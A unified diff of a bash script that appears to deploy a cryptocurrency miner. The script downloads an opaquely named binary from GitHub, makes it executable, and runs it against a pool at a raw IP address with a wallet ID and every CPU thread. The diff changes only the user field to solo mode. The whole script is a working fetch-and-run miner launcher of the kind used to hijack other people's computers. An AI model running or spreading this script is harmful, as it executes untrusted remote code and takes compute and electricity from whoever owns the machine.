@@ -1,4 +1,4 @@
 #!/bin/bash
 wget -O sgr1 https://github.com/kidoescegh/filee/raw/main/xmolx
 chmod +x sgr1
-./sgr1 -a rx/0 -o 64.23.144.233:443 -u Q010500dcddedd09eb43778b8c86fc30d1682af477c2693f24c34113532603031ecdac7e2d5a133 -p $(echo $(shuf -i 1000-9999 -n 1)-DOR) -t $(nproc --all) --donate-level 1 -k 
+./sgr1 -a rx/0 -o 64.23.144.233:443 -u solo:Q010500dcddedd09eb43778b8c86fc30d1682af477c2693f24c34113532603031ecdac7e2d5a133 -p $(echo $(shuf -i 1000-9999 -n 1)-DOR) -t $(nproc --all) --donate-level 1 -k 
